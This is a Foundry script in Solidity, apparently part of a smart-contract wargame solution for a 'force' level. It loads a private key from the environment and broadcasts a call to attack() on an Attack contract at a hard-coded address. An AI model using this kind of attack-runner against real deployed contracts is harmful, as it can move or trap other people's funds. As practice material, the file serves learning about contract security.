// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {Attack} from "src/force/Attack.sol";

contract AttackScript is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        // address ownerAddress = vm.addr(deployerPrivateKey);
        Attack attack = Attack(payable(0xe579c33C977A9adF8535EF1251e4bA57Dd6F7731));
        vm.startBroadcast(deployerPrivateKey);
        attack.attack();
        vm.stopBroadcast();
    }
}